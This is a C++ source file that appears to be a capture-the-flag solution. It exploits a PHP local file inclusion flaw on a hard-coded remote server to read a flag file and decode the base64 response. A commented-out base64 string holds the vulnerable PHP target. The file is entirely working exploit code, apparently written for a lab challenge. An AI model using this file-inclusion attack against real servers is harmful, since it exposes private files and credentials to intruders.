#include<iostream>
#include"Tube.h"
#include"HTTPToolkit.h"
#include"BaseEncoding.h"
#include"PHPTricks.h"
using namespace std;
string TOF_main() {
	//cout<< base64::b64decode("PD9waHAgDQpoZWFkZXIoIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgiKTsNCi8vJGZsYWcgPSAibW9jdGZ7Y1RmfmlzX3cwbmRlUmZ1MSEhfSINCiRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsNCnJlcXVpcmUgJGZpbGU7DQo/Pg0K");
	RemoteSession serv = remote("39.105.115.217", 8888);
	//GETRequest page = GETRequest("39.105.115.217:8888", "/");
	//page.table["Connection"] = "keep-alive";
	//serv.send(page.toString());
	//HTTPResponse response = parseResponse(serv.recv());
	//page = GETRequest("39.105.115.217:8888",/*response.table["hint"]*/"index22222.php");
	//serv.send(page.toString());
	//string message = serv.recv();
	GETRequest page = GETRequest("39.105.115.217:8888", FileInclude("flag123456789.php", "flag123456789.php", true).toString());
	serv.send(page.toString());
	HTTPResponse response = parseResponse(serv.recv());
	return base64::b64decode(response.body);
}